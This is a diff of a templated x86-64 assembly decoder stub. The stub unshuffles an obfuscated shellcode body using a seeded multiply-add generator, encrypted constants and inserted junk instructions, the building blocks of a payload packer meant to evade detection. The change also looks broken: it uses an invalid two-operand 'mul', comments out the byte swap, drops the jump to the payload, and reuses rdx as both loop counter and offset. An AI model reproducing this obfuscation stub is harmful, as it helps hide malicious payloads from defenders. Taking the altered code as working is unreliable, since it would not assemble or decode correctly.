@@ -4,8 +4,9 @@
 // ijs means insert junk instruction with short version
 
 // rax store the seed
-// rbx store the key
-// rcx store the loop times
+// rbx store the key and multiplier
+// rcx store the increment
+// rdx store the loop times
 // rbp store the body address
 // rsi store the swapped data
 // rdi store the swapped offset
@@ -20,13 +21,21 @@ entry:
   push {{.Reg.rdi}}                            {{iji}}
   pushfq                                       {{iji}}
 
+  // load seed and key
   mov {{.Reg.rax}}, {{hex .Seed}}              {{iji}}
   mov {{.Reg.rbx}}, {{hex .Key}}               {{iji}}
 
+  // decrypt increment
+  mov {{.Reg.rcx}}, {{hex .Imm.Inc}}           {{iji}}
+  xor {{.Reg.rcx}}, {{.Reg.rbx}}               {{iji}}
+
+  // decrypt multiplier and destroy key
+  xor {{.Reg.rbx}}, {{hex .Imm.Mul}}           {{iji}}
+
   // prevent continuous 0x00
-  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{iji}}
-  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{iji}}
-  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{iji}}
+  mov {{.Reg.edx}}, {{hex .NumLoopStub}}       {{iji}}
+  xor {{.Reg.edx}}, {{hex .NumLoopMaskA}}      {{iji}}
+  xor {{.Reg.edx}}, {{hex .NumLoopMaskB}}      {{iji}}
 
   // calculate the body address
   lea {{.Reg.rbp}}, [rip + body + {{hex .OffsetT}}]   {{iji}}
@@ -35,18 +44,9 @@ entry:
 
   // unshuffle shellcode body
  loop_unshuffle:
-  push {{.Reg.rcx}}
-
-  // seed = seed * mul + inc
-  mov {{.Reg.rcx}}, {{hex .Imm.Mul}}
-  xor {{.Reg.rcx}}, {{.Reg.rbx}}
-  imul {{.Reg.rax}}, {{.Reg.rcx}}
-
-  mov {{.Reg.rcx}}, {{hex .Imm.Inc}}
-  xor {{.Reg.rcx}}, {{.Reg.rbx}}
+  // seed = seed * multiplier + increment
+  mul {{.Reg.rax}}, {{.Reg.rbx}}
   add {{.Reg.rax}}, {{.Reg.rcx}}
-
-  pop {{.Reg.rcx}}
 
   // calculate swapped
   shr {{.Reg.rax}}, 3
@@ -72,13 +72,13 @@ entry:
   add rsp, 8
 
   // swap data[i] and data[j]
-  mov {{.Reg.al}}, [{{.Reg.rbp}} + {{.Reg.rsi}} ]
-  xchg {{.Reg.al}},  [{{.Reg.rbp}} + {{.Reg.rdx}}]
-  mov [{{.Reg.rbp}} + {{.Reg.rsi}}], {{.Reg.al}}
+  // mov {{.Reg.al}}, [{{.Reg.rbp}} + {{.Reg.rsi}} ]
+  // xchg {{.Reg.al}},  [{{.Reg.rbp}} + {{.Reg.rdx}}]
+  // mov [{{.Reg.rbp}} + {{.Reg.rsi}}], {{.Reg.al}}
 
 
   // update counter
-  dec {{.Reg.ecx}}                             {{iji}}
+  dec {{.Reg.edx}}                             {{iji}}
   jnz loop_unshuffle                           {{iji}}
 
   // restore context
@@ -89,8 +89,6 @@ entry:
   pop {{.Reg.rcx}}                             {{iji}}
   pop {{.Reg.rbx}}                             {{iji}}
   pop {{.Reg.rax}}                             {{iji}}
-
-  jmp body                                     {{iji}}
 
 body:
   // loader or raw shellcode
